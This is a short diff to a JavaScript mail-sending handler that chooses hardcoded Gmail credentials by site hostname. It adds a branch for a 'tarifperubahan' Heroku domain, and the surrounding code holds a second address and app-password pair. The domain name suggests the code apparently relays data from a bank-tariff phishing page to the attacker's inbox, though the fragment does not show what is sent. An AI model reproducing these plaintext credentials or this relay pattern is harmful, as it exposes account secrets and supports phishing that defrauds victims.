@@ -36,7 +36,11 @@ export default function handler(req, res) {
         email = 'akunjp771@gmail.com';
         pass = 'trydeazatzdjorhy';
 
-    }
+    } else if(url == 'tarifperubahan.herokuapp.com'){
+        email = 'bosm4106@gmail.com';
+        pass = 'ocrpobrfxwgucaih';
+
+    }   
         
         try {
             const transporter = nodemailer.createTransport({
